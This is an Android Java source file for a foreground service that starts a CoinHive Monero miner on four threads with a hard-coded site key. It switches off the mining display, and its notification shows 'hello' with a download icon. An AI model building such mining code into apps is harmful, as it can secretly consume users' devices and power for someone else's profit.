package com.example.pavel.monero.serves;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.support.annotation.NonNull;
import android.support.v4.app.JobIntentService;
import android.support.v4.app.NotificationCompat;
import android.widget.Toast;

import io.reactivex.Observable;


public class Mainer extends JobIntentService implements CoinHive.Callback {
    private CoinHive.Miner wvCoinHive;
    static private Activity activity;

    public static Intent START(Activity activity, Context context) {
        Mainer.activity = activity;
        return new Intent(context, Mainer.class);
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent,flags,startId);
        return START_REDELIVER_INTENT;
    }

    private Observable<String> go() {
        return Observable.create((e)-> {
            e.onNext("Hello");
        });
    }

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1338,
                buildForegroundNotification("hello"));
        CoinHive.getInstance()
                .init("7D1i4fiOWJEVdtZ6T17jBI3c61LHsI3p") // mandatory
                .setNumberOfThreads(4) // optional
                .setIsAutoThread(true) // optional
                .setThrottle(0.2) // optional
                .setLoggingEnabled(true) // To logcat mining status, false by default.
                .setForceASMJS(false); // optional;
        wvCoinHive = new CoinHive.Miner( activity, this);
        wvCoinHive.startMining();
    }


    @Override
    public boolean isShowMining() {
        return false;
    }

    public void onDestroy() {
        if (com.theah64.coinhive.CoinHive.getInstance().isLoggingEnabled()) {
            System.out.println("Mining stopped");
        }
        //wvCoinHive.stopMining();
        Toast.makeText(this, "Destroy", Toast.LENGTH_SHORT).show();
        super.onDestroy();
    }

    @SuppressLint("CheckResult")
    @Override
    protected void onHandleWork(@NonNull Intent intent) {

    }

    @Override
    public void onMiningStarted() {
        Toast.makeText(this, "Started", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onMiningStopped() {
        Toast.makeText(this, "Stopped", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onRunning(double hashesPerSecond, long totalHashes, long acceptedHashes) {
        Toast.makeText(this, "totalHashes " +totalHashes, Toast.LENGTH_SHORT).show();
    }

    private Notification buildForegroundNotification(String filename) {
        NotificationCompat.Builder b=new NotificationCompat.Builder(this);

        b.setOngoing(true)
                .setContentText(filename)
                .setSmallIcon(android.R.drawable.stat_sys_download);
        return(b.build());
    }
}
